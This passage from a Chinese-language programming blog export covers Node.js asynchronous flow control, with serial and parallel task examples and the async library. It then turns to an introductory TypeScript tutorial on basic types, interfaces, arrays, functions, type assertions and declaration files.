color 的值传给它。而 color 变成了匿名函数的采纳数，也就是这个匿名函数内部的本地变量，当匿名函数外面的 color 值发生变化的时候，本地的 color 不会受到影响 123456789101112// 用匿名函数保留全局变量的值function asyncFunction(callback)&#123; setTimeout(callback,200);&#125;let color = 'blue';(color =&gt; &#123; asyncFunction(() =&gt; &#123; console.log('The color is',color); &#125;);&#125;)(color);color = 'green'; 闭包是 Node 开发中要经常用到的一个编程技巧，接着看看怎么让异步逻辑顺序执行，好掌握程序的流程。 异步逻辑的顺序化在异步程序的执行过程汇中，有些任务可能会随时发生，跟程序中的其他部分在做什么没有关系，什么时候做这些任务都不会出问题。但有些任务只能在某些特定的任务之前或之后做。 让一组异步任务顺序执行的概念也被 Node 社区称为流程控制。这种控制分成两类：串行和并行： 需要一个接着一个执行的任务叫作串行任务。创建一个目录并往里放一个文件的任务就是串行的。你不能在创建目录前往里放文件。 不需要一个接着一个执行的任务叫作并行任务。这些任务彼此之间开始和结束的时间并不重要，但在后续逻辑执行之前它们应该全部执行完。下载几个文件然后把它们压缩到一个 zip归档文件中就是并行任务。这些文件的下载可以同时进行，但在创建归档文件之前应该全部下载完。 跟踪串行和并行的流程控制要做编程记账的工作。在实现串行化流程控制时，需要跟踪当前执行的任务，或维护一个尚未执行任务的队列。实现并行化流程控制时需要跟踪有多少个任务要执行完成了。 有一些可以帮助记账的流程控制工具，它们能够让组织异步的串行或并行化任务变得很容易。尽管社团创建了许多序列化异步逻辑的辅助工具。但亲自动手是实现流程控制可以让我们看透其中的玄机。 何时使用串行流程控制可以使用回调让几个异步任务按顺序执行，但是如果任务很多，就必须组织一下，否则过多的回调嵌套会把代码搞得很乱。 下面的这段代码就是用回调让任务顺序执行的。这里例子用 setTimeout 模拟需要花时间执行的任务：第一个任务用了1秒，第二个0.5秒，最后一个十分之一秒。setTimeout 只是一个人工模拟，在真正的代码中可能是读取文件、发起HTTP 请求。 123456789setTimeout(() =&gt;&#123; console.log('I execute first.'); setTimeout(() =&gt;&#123; console.log('I execute next.'); setTimeout(() =&gt;&#123; console.log('I execute last.'); &#125;,100); &#125;,500);&#125;,1000); 此外，也可以用 Async 这样的流程控制工具执行这些任务。Async 用起来简单直接，并且代码量小。安装Async 1npm i async 简化代码： 123456789101112131415161718192021const async = require('async');async.series([ callback =&gt; &#123; setTimeout(() =&gt; &#123; console.log('I execute first.'); callback(); &#125;, 1000); &#125;, callback =&gt; &#123; setTimeout(() =&gt; &#123; console.log('I execute next.'); callback(); &#125;, 500); &#125;, callback =&gt; &#123; setTimeout(() =&gt; &#123; console.log('I execute last.'); callback(); &#125;, 100); &#125;,]); 尽管这种用流程控制实现的代码很多，但通常可读性和可维护性更强，一般也不会一直用流程控制，当碰到想要躲开回调嵌套的情况是，它就会是改善代码可读性的好工具了。 看过这个用特制工具实现串行化流程控制的例子后，我们看看怎么从头实现它。 实现串行化流程控制为了用串行化流程控制让几个异步任务按顺序执行，需要先把这些任务按预期的执行顺序放到一个数组中。这个数组将起到队列的作用：完成一个任务后按顺序从数组中取出下一个。 数组中的每个任务都是一个函数，任务完成之后应该调用一个处理函数，告诉它错误状态和结果。在这一实现中，如果有错误，处理器函数就会终止，否则就从队列中取出下一个任务执行它。 实现一个小程序，让它从一个随机选择的 RSS 预订源中获取一篇文章的标题和URL，并显示出来，RSS预订源列表放在一个文本文件中。这个程序的输出是像下面这样的文本： 12Of Course ML Has Monads!http://lambda-the-ultimate.org/node/4306 需要从 npm 下载两个辅助模块。 12npm i --save request@2.60.0npm i --save htmlparser@1.7.7 request 模块是个经过简化的 HTTP 客户端，你可以用它获取 RSS 数据。 htmlparser 模块能把原始的 RSS数据转换成 JavaScript数据结构。 创建一个 index.js 文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465const fs = require('fs');const request = require('request');const htmlparser = require('htmlparser');const configFilename = './rss_feeds.txt';// 确保包含RSS订阅源 URL 列表的文件存在function checkForRSSFile() &#123; fs.exists(configFilename, (exists) =&gt; &#123; // 有错误就返回 if(!exists) return next(new Error(`Missing RSS file: $&#123;configFilename&#125;`)); next(null,configFilename); &#125;);&#125;// 读取并解析包含预订源 URL 的文件function readRSSFile(configFilename)&#123; fs.readFile(configFilename,(err,feedList) =&gt;&#123; if(err) return next(err); // 将预订源URL 列表转换成字符串，然后分隔成一个数组 feedList = feedList.toString().replace(/^\s+|\s+$/g,'').split('\n'); // 从预订源URL 数组中随机选择一个预订源 URL const random = Math.floor(Math.random()* feedList.length); next(null,feedList[random]); &#125;);&#125;// 向选定的订阅源发送 HTTP 请求以获取数据function downloadRSSFeed(feedUrl)&#123; request(&#123;uri:feedUrl&#125;,(err,res,body) =&gt;&#123; if(err) return err; if(res.statusCode !== 200) return next(new Error('Abnormal response status code')); next(null,body); &#125;);&#125;// 将预订源数据解析到一个条目数组中function parseRSSFeed(rss)&#123; const handler = new htmlparser.RssHandler(); const parser = new htmlparser.Parser(handler); parser.parseComplete(rss); if(!handler.dom.items.length) return next(new Error('No RSS items found')); // 如果有数据，显示第一个预订源条目的标题和 URL const item = handler.dom.items.shift(); console.log(item.title); console.log(item.link);&#125;// 把所有要做的任务按执行顺序添加到一个数组中const tasks = [ checkForRSSFile, readRSSFile, downloadRSSFeed, parseRSSFeed]// 负责执行任务的 next函数function next(err,result)&#123; // 如果任务出错，则抛出异常 if(err) return err; // 从任务数组中取出下一个任务 const currentTask = tasks.shift(); if(currentTask)&#123; // 执行当前任务 currentTask(result); &#125;&#125;;// 开始串行化执行任务next(); 在试用这个程序之前，先在程序脚本所在的目录下创建一个 rss_feeds.txt 文件。如果你自己没有预订源，可以试一下 Node 博客，地址是 http://blog.nodejs.org/feed/。把预订源 URL 放到这个文本文件中，每行一条。文件创建好后，打开命令行窗口输入下面的命令进入程序所在目录并执行脚本： 1node index.js 接着在控制台可以看到这样的结果： 如本例中的实现所示，串行化流程控制本质上是在需要时让回调进场，而不是简单地把它们嵌套起来。 现在已经知道怎么串行化流程控制了，接下来看看如何让异步任务并行执行。 实现并行化流程控制为了让异步任务并行执行，仍然是要把任务放到数组中，但任务的存放顺序无关紧要。每个任务都应该调用处理器函数增加已完成任务的计数值，当所有任务都完全后，处理器函数应该执行后续的逻辑。 下面实现一个简单的程序作为并行化流程控制的例子，它会读取几个文本文件的内容，并输出单词在整个文件中出现的次数。我们会用异步的 readFile 函数读取文本文件的内容，所有几个文件的读取可以并行执行。 这个程序的输出看起来应该像是下面这样（尽管实际上可能要长很多） 1234would:2wrench:3writeable:1you:24 新建一个要分析的文本文件的文件夹：text. 实现并行化流程控制的代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// word_count/word_count.jsconst fs = require('fs');const tasks = [];const wordCounts = &#123;&#125;;const filesDir = '../text';let completedTasks = 0;// 当所有任务全部完全后，列出文件中用到的每个单词以及用了多少次function checkIfComplete() &#123; completedTasks++; if (completedTasks === tasks.length) &#123; for (let index in wordCounts) &#123; console.log(`$&#123;index&#125;:$&#123;wordCounts[index]&#125;`); &#125; &#125;&#125;function addWordCount(word) &#123; wordCounts[word] = (wordCounts[word]) ? wordCounts[word] + 1 : 1;&#125;// 对文本中出现的单词计数function countWordsInText(text) &#123; const words = text.toString().toLowerCase().split(/\W+/).sort(); words.filter(word =&gt; word).forEach(word =&gt; addWordCount(word));&#125;// 得出 text 目录中的文件列表fs.readdir(filesDir, (err, files) =&gt; &#123; if (err) throw err; files.forEach(file =&gt; &#123; // 定义每个处理文件的任务，每个任务中都会调用一个异步读取文件的函数并对文件中使用的单词计数 const task = (file =&gt; &#123; return () =&gt; &#123; fs.readFile(file, (err, text) =&gt; &#123; if (err) throw err; countWordsInText(text); checkIfComplete(); &#125;); &#125; &#125;)(`$&#123;filesDir&#125;/$&#123;file&#125;`); // 把所有任务都添加到函数调用数组中 tasks.push(task); &#125;); // 开始并行执行任务 tasks.forEach(task =&gt; task())&#125;); 执行： 1node word_count.js 可以看到大概这样的结果: 现在，我们已经知道串行和并行的流程化控制的底层机制了，接下来可以用社区贡献的工具在程序中实现流程控制，而不必自己实现。 利用社区里的工具社区中的很多附加模块都提供了方便好用的流程控制工具，比较流行的是 Async、Step 和 Seq 三个。 总结 Node 模块可以被组织可重用的模块 require 函数是用来加载模块的 module.exports 和 exports 对象是用来分享模块内的函数和变量的 package.json 文件是用来指明依赖项的，还要指明将哪个文件作为主文件 异步逻辑可以用来嵌套回调、事件发射器和流程控制工具来控制。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TypeScript 入门]]></title>
    <url>%2F2018-11-28-TypeScript.html</url>
    <content type="text"><![CDATA[一直以来，都希望可以掌握一门强类型语言，大学学的java、c语言都因为当时兴致不浓慢慢都丢得差不多了。TypeScript 是 JavaScript 的一个超集，白鹭引擎中的wing3 开发也是用ts，所以学习这本强类型语言。由于是刚入门，在百度搜索上面看到有一个阮一峰老师点评的 TypeScript入门教程 上面教程作者是：xcatliu 根据这个教程来学习 TypeScript 并做相关记录。 简介什么是TypeScript官网的定义： TypeScript is a typed superset of JavaScript that compiles to plain JavaScript. Any browser. Any host. Any OS. Open source. 翻译： TypeScript 是 JavaScript 的类型的超集，它可以编译成纯 JavaScript。编译出来的 JavaScript 可以运行在任何浏览器上。TypeScript 编译工具可以运行在任何服务器和任何系统上。TypeScript 是开源的。 为什么选择 TypeScriptTypeScript 增加了代码的可读性和可维护性 类型系统实际上是最好的文档，大部分的函数看看类型的定义就可以知道如何使用了 可以在编译阶段就发现大部分错误，这总比在运行时候出错好 增强了编辑器和 IDE 的功能，包括代码补全、接口提示、跳转到定义、重构等 TypeScript 非常包容 TypeScript 是 JavaScript 的超集，.js 文件可以直接重命名为 .ts 即可 即使不显式的定义类型，也能够自动做出类型推论 可以定义从简单到复杂的几乎一切类型 即使 TypeScript 编译报错，也可以生成 JavaScript 文件 兼容第三方库，即使第三方库不是用 TypeScript 写的，也可以编写单独的类型文件供 TypeScript 读取 TypeScript 拥有活跃的社区 大部分第三方库都有提供给 TypeScript 的类型定义文件 Google 开发的 Angular2 就是使用 TypeScript 编写的 TypeScript 拥抱了 ES6 规范，也支持部分 ESNext 草案的规范 TypeScript 的缺点任何事物都是有两面性的，作者认为 TypeScript 的弊端在于： 有一定的学习成本，需要理解接口（Interfaces）、泛型（Generics）、类（Classes）、枚举类型（Enums）等前端工程师可能不是很熟悉的概念 短期可能会增加一些开发成本，毕竟要多写一些类型的定义，不过对于一个需要长期维护的项目，TypeScript 能够减少其维护成本 集成到构建流程需要一些工作量 可能和一些库结合的不是很完美 安装 TypeScriptTypeScript 的命令行工具安装方法如下： 1npm install -g typescript 以上命令会在全局环境下安装 tsc 命令，安装完成之后，我们就可以在任何地方执行 tsc 命令了。 编译一个 TypeScript 文件很简单： 1tsc hello.ts 我们约定使用 TypeScript 编写的文件以 .ts 为后缀，用 TypeScript 编写 React 时，以 .tsx 为后缀。 Hello TypeScript简单例子 123456function sayHello(person:string)&#123; return 'Hello,' + person;&#125;let user = 'Tom';console.log(sayHello(user)); 然后执行 1tsc hello.ts 会编译成一个好的文件，hello.js 12345function sayHello(person) &#123; return 'Hello,' + person;&#125;var user = 'Tom';console.log(sayHello(user)); TypeScript 中，使用 :指定变量类型， :的前后有没有空格都可以 上述例子中，用 :指定 person 参数类型为 string。TypeScript只会进行静态检查，如果有错误，编译的时候就会报错。 编译下面的内容 123456function sayHello(person:string)&#123; return 'Hello,' + person;&#125;let user = [0, 1, 2];console.log(sayHello(user)); 编辑器会报错 但js文件还是编译出来了 12345function sayHello(person) &#123; return 'Hello,' + person;&#125;var user = [0, 1, 2];console.log(sayHello(user)); TypeScript 编译的时候即使报错了，还是会生成编译结果，我们仍然可以使用这个编译之后的文件。 如果要在报错的时候终止 js 文件的生成，可以在 tsconfig.json 中配置 noEmitOnError 即可。关于 tsconfig.json，请参阅官方手册（中文版）。 基础本部分介绍了 TypeScript 中的常用类型和一些基本概念，旨在让大家对 TypeScript 有个初步的理解。具体内容包括： 原始数据类型 任意值 类型推论 联合类型 对象的类型——接口 数组的类型 函数的类型 类型断言 声明文件 内置对象 原始数据类型JavaScript 的类型分为两种：原始数据类型（Primitive data types）和对象类型（Object types）。 原始数据类型包括：布尔值、数值、字符串、null、undefined以及 ES6 中的新类型 Symbol。 布尔值布尔值是最基础的类型，在TypeScript 中，使用 boolean定义布尔值类型 12let isDone:boolean = false;// var isDone = false; 注意，使用构造函数 Boolean创造的对象不是布尔值 12let createdByNewBoolean:boolean = new Boolean(1);// error TS2322: Type 'Boolean' is not assignable to type 'boolean'.'boolean' is a primitive, but 'Boolean' is a wrapper object. Prefer using 'boolean' when possible. 事实上 new Boolean()返回的是一个 Boolean对象： 1let createdByNewBoolean:Boolean = new Boolean(1); 直接调用 Boolean，也可以返回一个 boolean类型： 1let createByBoolean:boolean = Boolean(1); 在 TypeScript中，boolean是 JavaScript 中的基本类型，而 Boolean是 JavaScript 中的构造函数。其他基本类型（除了null和undefined）一样。 数值使用 number定义数值类型： 12345678let decLiteral: number = 6;let hexLiteral: number = 0xf00d;// ES6 中的二进制表示法let binaryLiteral: number = 0b1010;// ES6 的八进制表示法let octalLiteral: number = 0o733;let notANumber: number = NaN;let infinityNumber: number = Infinity; 编译结果： 12345678var decLiteral = 6;var hexLiteral = 0xf00d;// ES6 中的二进制表示法var binaryLiteral = 10;// ES6 的八进制表示法var octalLiteral = 475;var notANumber = NaN;var infinityNumber = Infinity; 其中 0b1010 和 0o744 是 ES6 中的二进制和八进制表示法，它们会被编译为十进制数字。 字符串使用 string定义字符串类型 12345let myName: string = 'Tom';let myAge: number = 25;// 模块字符串let sentence: string = `Hello,my name is $&#123;myName&#125;,I'll be $&#123;myAge + 1&#125; years old next month.` 编辑结果 1234var myName = 'Tom';var myAge = 25;// 模块字符串var sentence = "Hello,my name is " + myName + ",\nI'll be " + (myAge + 1) + " years old next month."; ES6 中的模板字符串，${expr} 用来在模板字符串中嵌入表达式。 空值JavaScript 没有空值（Void）的概念，在 TypeScript 中，可以用 void表示没有任何的返回值的函数： 123function alertName() :void&#123; alert('HAHAHAHA');&#125; 声明一个 void类型的变量没有什么用，因为你只能将它赋值为 undefined或者是 null 1let unusable: void = undefined; Null 和 Undefined在 TypeScript 中，可以使用 null 和 undefined来定义两个原始数据类型: 12let u: undefined = undefined;let n: null = null; 与 void 的区别是，undefined 和 null 是所有类型的子类型。也就是说 undefined 类型的变量，可以赋值给 number 类型的变量： 123456789// 都不会报错let u: undefined = null;let n: null = undefined;let num1: number = undefined;let num2: number = null;let num3:undefined;let num4:null; 而 void 类型的变量不能赋值给 number 类型的变量： 123let u: void;let num: number = u;// TS2322: Type 'void' is not assignable to type 'number'. 任意值任意值（Any）用来表示允许赋值为任意类型 什么是任意值类型如果是一个普通类型，在赋值过程中改变类型是不给允许的： 123let myFavoriteNumber: string = 'seven';myFavoriteNumber = 7;// error TS2322: Type '7' is not assignable to type 'string'. 但如果是 any类型，则运行被赋值为任意类型 12let myFavoriteNumber: any = 'seven';myFavoriteNumber = 7; 任意值的属性和方法在任意值上访问任何属性都是被运行的： 123let anyThing: any = 'hello';console.log(anyThing.myName);console.log(anyThing.myName.firstName); 也运行调用任何方法 1234let anyThing: any = 'Tom';anyThing.setName('Jerry');anyThing.setName.sayHello('Jerry');anyThing.setName.setFirstName('Jerry'); 可以认为，声明一个变量为任意值之后，对它的任何操作，返回的内容的类型都是任意值。 未声明类型的变量变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型： 12345let something;something = 'seven';something = 7;something.setName('Tom'); 等价于 12345let something: any;something = 'seven';something = 7;something.setName('Tom'); 类型推论如果没有明确的指定类型，那么 TypeScript 会依照类型推论（Type Inference）的规则推断出来一个类型 什么是类型推论一下代码没有指定类型，但是在编译的时候会报错 123let number = 'seven';number = 7;// Type '7' is not assignable to type 'string'. 事实上，它等价于： 123let number: string = 'seven';number = 7;// Type '7' is not assignable to type 'string'. TypeScript 会在没有明确的指定类型的时候推测出一个类型，这就是类型推论。 如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查： 123let number;number = 'seven'number = 7; 对象的类型——接口在TypeScript中，我们使用接口（interfaces）来定义对象的类型 什么是接口在面向对象语言中，接口（Interfaces）是一个很重要的概念，它是对行为的抽象，而具体如何行动需要由类（classes）去实现（implements） TypeScript 中的接口是一个灵活的概念，除了可用于对类的一部分行为进行抽象以外，也常用于对「对象的形状（Shape）」进行描述。 简单的例子 123456789interface Person&#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25&#125; 上面的例子，我们定义了一个接口 Person，接着定义了一个变量 tom,它的类型是 Person。这样，我们就约束了 tom的形状必须和 Person一样了。 接口一般首字母大写。有的编程语言中会建议接口的名称加上 I 前缀。 定义的变量比接口少了一些属性是不允许的： 12345678910interface Person&#123; name: string; age: number;&#125;let tom: Person&#123; name: 'Tom'&#125;// error TS2322: Type '&#123; name: string; &#125;' is not assignable to type 'Person'.// Property 'age' is missing in type '&#123; name: string; &#125;'. 多了一些属性是不允许的： 123456789101112interface Person&#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male',&#125;// error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'. // Object literal may only specify known properties, and 'gender' does not exist in type 'Person'. 可见，赋值的时候，变量的形状必须和接口的形状保持一致 可选属性有时候，我们希望不要完全匹配一个形状，那么可以用可选属性： 12345678interface Person&#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom'&#125; 123456789interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25&#125;; 可选属性的含义是该属性可以不存在。 这时仍然不允许添加未定义的属性： 123456789101112interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male'&#125;// error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Object literal may only specify known properties, and 'gender' does not exist in type 'Person'. 任意属性有时候我们希望一个接口允许有任意的属性，可以使用以下的方式： 12345678910interface Person &#123; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: 'Tom', gender: 'male'&#125; 使用 [propName: string]定义了任意属性取 string 类型的值 需要注意的是，一旦定义了任意属性，那么确定属性和可选属性都必须是它的子属性 1234567891011121314interface Person &#123; name: string; age?: number; [propName: string]: string;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male',&#125;// error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Property 'age' is incompatible with index signature.// Type 'number' is not assignable to type 'string'. 上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。 另外，在报错信息中可以看出，此时 { name: &#39;Tom&#39;, age: 25, gender: &#39;male&#39; } 的类型被推断成了 { [x: string]: string | number; name: string; age: number; gender: string; }，这是联合类型和接口的结合。 只读属性有时候我们希望对象中的一些字段只能在创建的时候被赋值，那么可以用 readonly定义只读属性 123456789101112131415interface Person &#123; readonly id : number; name: string; age?: number; [propName: string] :any;&#125;let tom: Person = &#123; id: 89757, name: 'Tom', gender: 'male'&#125;tom.id = 7893;// error TS2540: Cannot assign to 'id' because it is a constant or a read-only property. 上例中，使用 readonly定义的属性 id初始化后，又被赋值了，所以报错了。 注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候 12345678910111213141516interface Person &#123; readonly id: number; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: 'Tom', gender: 'male'&#125;;tom.id = 89757;// error TS2322: Type '&#123; name: string; gender: string; &#125;' is not assignable to type 'Person'.// Property 'id' is missing in type '&#123; name: string; gender: string; &#125;'.// error TS2540: Cannot assign to 'id' because it is a constant or a read-only property. 上例中，报错信息有两处，第一处是在对 tom 进行赋值的时候，没有给 id 赋值。 第二处是在给 tom.id 赋值的时候，由于它是只读属性，所以报错了。 数据的类型在 TypeScript 中，数组类型有多种定义方式，比较灵活。 [类型+方括号]表示法最简单的方法是使用 [类型+方括号]来表示数组： 1let fibonacci: number[] = [1,2,3,4,5]; 数组的项中不允许出现其他的类型 12let fibonacci: number[] = [1,2,'3',4,5];// error TS2322: Type 'string' is not assignable to type 'number'. 上例中，[1, &#39;1&#39;, 2, 3, 5] 的类型被推断为 (number | string)[]，这是联合类型和数组的结合。 数组的一些方法的参数也会根据数组在定义时约定的类型进行限制： 123let fibonacci: number[] = [1,2,3,4,5];fibonacci.push('8');//error TS2345: Argument of type '"8"' is not assignable to parameter of type 'number'. 上例中，push 方法只允许传入 number 类型的参数，但是却传了一个 string 类型的参数，所以报错了。 数组泛型也可以使用数组泛型（Array Generic）Array&lt;elemType&gt;来表示数组： 1let fibonacci: Array&lt;number&gt; = [1,1,2,3,5]; 用接口表示数组接口也可以用来描述数组： 1234interface NumberArray &#123; [index: number]: number;&#125;let fibonacci: NumberArray = [1,2,3,4,5]; NumberArray 表示：只要 index 的类型是 number，那么值的类型必须是 number。 any 在数组中的应用一个比较常见的做法是， 用 any表示数组中允许出现任意类型： 1let list: any[] = ['lbh',32,&#123;website:'http://laibh.top'&#125;] 类数组类数组（Array-like Object）不是数组类型，比如 arguments: 12345function sum()&#123; let args: number[] = arguments;&#125;// error TS2322: Type 'IArguments' is not assignable to type 'number[]'.// Property 'pop' is missing in type 'IArguments'. 事实上常见的类数组都有自己的接口定义，如 IArguments, NodeList, HTMLCollection 等： 123function sum()&#123; let args: IArguments = arguments;&#125; 函数的类型函数声明在 JavaScript 中，有两种常见的定义函数的方式——函数声明（Function Declaration）和函数表示式（Function Expression） 123456789// 函数声明（Function Declaration）function sum(x, y)&#123; return x + y;&#125;// 函数表达式（Function Expression）let mySum = function(x, y)&#123; return x + y;&#125; 一个函数有输入和输出，要在 TypeScript 中对其进行约束，需要把输入和输入都考虑到，其中函数声明的类型定义较简单： 123function sum(x:number, y:number) :number &#123; return x + y;&#125; 注意，输入多余的（或者少于要求的）参数，是不被允许的： 123456function sum(x:number, y:number) :number &#123; return x + y;&#125;sum(1,2,3);// error TS2554: Expected 2 arguments, but got 3. 123456function sum(x:number, y:number) :number &#123; return x + y;&#125;sum(1);// error TS2554: Expected 2 arguments, but got 1. 函数表达式写一个对函数表达式（Function Expression）的定义： 123let mySum = function(x: number, y: number) : number&#123; return x + y;&#125; 这是可以通过编译的，不过事实上，上面的代码只对等号右侧的匿名函数进行了类型定义，而等号左边的 mySum，是通过赋值操作进行类型推论而推断出来的。如果需要我们手动给 mySum 添加类型，则应该是这样： 123let mySum:(x:number, y:number) =&gt; number = function(x: number, y: number) : number&#123; return x + y;&#125; 注意不要混淆了 TypeScript 中的 =&gt; 和 ES6 中的 =&gt;。 在 TypeScript 的类型定义中，=&gt; 用来表示函数的定义，左边是输入类型，需要用括号括起来，右边是输出类型。 在 ES6 中，=&gt; 叫做箭头函数，应用十分广泛，可以参考 ES6 中的箭头函数。 用接口定义函数的形状也可以用接口的方式来定义一个函数需要符合的形式： 1234567interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string)&#123; return source.search(subString) !== -1;&#125; 可选参数与接口中的可选属性类似，我们可以用 ？表示可选参数： 12345678function buildName(firstName: string, lastName?: string)&#123; if(lastName)&#123; return `$&#123;firstName&#125; $&#123;lastName&#125;`; &#125; return firstName;&#125;let tomcat = buildName('Tom','cat');let tom = buildName('Tom'); 需要注意的是，可选参数必须接在必需参数后面。换句话说，可选参数后面不允许再出现必须参数了： 12345678910function buildName(firstName?: string, lastName: string) &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName('Tom', 'Cat');// error TS1016: A required parameter cannot follow an optional parameter. 参数默认值TypeScript 会将添加了默认值的参数识别为可选参数： 123456789function buildName(firstName?: string, lastName: string = 'Cat') &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName('Tom'); 此时就不受「可选参数必须接在必需参数后面」的限制了： 123456789function buildName(firstName: string = 'Tom', lastName: string ) &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let cat = buildName(undefined, 'Cat'); 剩余参数ES6中，可以使用 ...rest的方式获取函数的剩余参数（rest参数） 1234567function push(array,...items)&#123; items.forEach(function(item)&#123; array.push(item); &#125;);&#125;let a = [];push(a,1,2,3); 事实上， items是一个数组，所以我们用数组的类型来定义它： 1234567function push(array: any[],...items: any[])&#123; items.forEach(function(item)&#123; array.push(item); &#125;);&#125;let a = [];push(a,1,2,3); 注意，rest 参数只能是最后一个参数，关于 rest 参数，可以参考 ES6 中的 rest 参数。 重载重载允许一个函数接受不同的数量或者类型的参数，做不同的处理 比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 &#39;hello&#39; 的时候，输出反转的字符串 &#39;olleh&#39;。 利用联合类型，我们可以这么实现： 1234567function reverse(x: number| string): number| string&#123; if(typeof x === 'number')&#123; return Number(x.toString().split('').reverse().join('')) &#125;else if(typeof x === 'string')&#123; return x.split('').reverse().join(''); &#125;&#125; 然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串。 这时，我们可以使用重载定义多个 reverse 的函数类型： 123456789function reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string) : number | string&#123; if(typeof x === 'number')&#123; return Number(x.toString().split('').reverse().join('')); &#125;else if(typeof x === 'string')&#123; return x.split('').reverse().join(''); &#125;&#125; 上例中吗，我们重复了多次函数 reverse的定义，前几次都是函数的定义，最后一次是函数的实现。 注意，TypeScript 会优先从最前面的函数定义开始匹配，所以多个函数如果有包含关系，需优先把精确的定义写在前面。 类型断言类型断言（Type Assertion） 可以用来手动指定一个值的类型 语法1&lt;类型&gt; 值 或 1值 as 类型 在 tsx 语法中必须使用后一种 例子：将一个联合类型的变量指定为一个更加具体的类型当TypeScript 不确定一个联合类型的变量到底是那个类型的的时候，我们只能访问次联合类型的所有类型里共有的属性或方法: 12345function getLength(something: string|number) :number&#123; return something.length;&#125;// rror TS2339: Property 'length' does not exist on type 'string | number'.// Property 'length' does not exist on type 'number'. 而有时候，我们确实需要在还不确定类型的时候就访问一个类型的属性或者是方法：比如： 12345678function getLength(something: string|number) :number&#123; if(something.length)&#123; return something.length; &#125;else&#123; return something.toString().length; &#125; &#125;// 还是报上面的错，不过报错的位置是两处 上例中，获取 something.length的时候会报错 此时可以使用类型断言，将 something断言成 string 12345678function getLength(something: string|number) :number&#123; if((&lt;string&gt;something).length)&#123; return (&lt;string&gt;something).length; &#125;else&#123; return something.toString().length; &#125; &#125; 类型断言的用法如上，在需要断言的变量上加上 &lt;type&gt;即可。 类型断言不是类型转换，断言成一个联合类型中不存在的类型是不允许的 1234function toBoolean(something: string | number): boolean &#123; return &lt;boolean&gt;something;&#125;// Conversion of type 'string | number' to type 'boolean' may be a mistake because neither type sufficiently overlaps with the other. If this was intentional, convert the expression to 'unknown' first.Type 'number' is not comparable to type 'boolean'. 声明文件当使用第三方库时，我们需要引用它的声明文件 声明语句 例如是 jQuerty ，我们通常这样获取一个 id是 foo的元素： 123$('#foo');// orjQuery('#foo'); 但是在 TypeScript 中，我们并不知道 $或 jQuery是什么东西： 12jQuery('#foo');// Cannot find name 'jQuery'. 这时，我们需要使用 declare关键字来定义它的类型，帮助 TypeScript 判断我们传入的参数类型对不对： 12declare var jQuery: (selector: string) =&gt; any;jQuery('#foo'); declare 定义的类型只会用于编译时的检查，编译结果中会被删除。 上例的编译结果是： 1jQuery('#foo'); 声明文件 通常我们会在类型声明放到一个单独的文件中，这就是声明文件： 12// jQuery.d.tsdeclare var jQuery:(string) =&gt; any; 我们约定声明文件是以 .d.ts为后缀 然后在使用的文件开头，用「三斜线指令」表示引用了声明文件： 123/// &lt;reference path='./jQuery.d.ts'/&gt;jQuery('#foo'); 第三方声明文件当然，jQuery 的声明文件不需要我们定义了，已经有人帮我们定义好了：jQuery in DefinitelyTyped。 我们可以直接下载下来使用，但是更推荐的是使用工具统一管理第三方库的声明文件。 社区已经有多种方式引入声明文件，不过 TypeScript 2.0 推荐使用 @types 来管理。 @types 的使用方式很简单，直接用 npm 安装对应的声明模块即可，以 jQuery 举例： 1npm i @types/jquery --S -D 可以在这个页面搜索你需要的声明文件。 内置对象JavaScript 中有很多内置对象，它们可以直接在 TypeScript 中当做定义好了的类型。 内置对象是指根据标准在全局作用域（Global）上存在的对象。这里的标准是指 ECMAScript 和其他环境（比如 DOM）的标准。 ECMAScript 的内置对象ECMAScript 标准提供的内置对象有： Boolean、Error、Date、RegExp等。 我们可以在 TypeScript 中将变量定义为这些类型： 1234let b : Boolean = new Boolean(1);let e : Error = new Error('Error occurred');let d : Date = new Date();let r : RegExp = /[a-z]/; 更多的内置对象，可以查看 MDN 的文档。 而他们的定义文件，则在 TypeScript 核心库的定义文件中。 DOM 与 BOM 的内置对象 DOM 和 BOM 提供的内置对象： Document、HTMLElement、Event、NodeList等。 TypeScript 中会经常使用到这些类型： 12345let body: HTMLElement = document.body;let allDiv: NodeList = document.querySelectorAll('div');document.addEventListener('click',function(e:MouseEvent)&#123; // do something&#125;); 它们的定义文件同样在 TypeScript 核心库的定义文件中。 TypeScript 核心库的定义文件TypeScript 核心库的定义文件中定义了所有浏览器环境需要用到的类型，并且是预置在 TypeScript 中的。 当你在使用一些常用的方法的时候，TypeScript 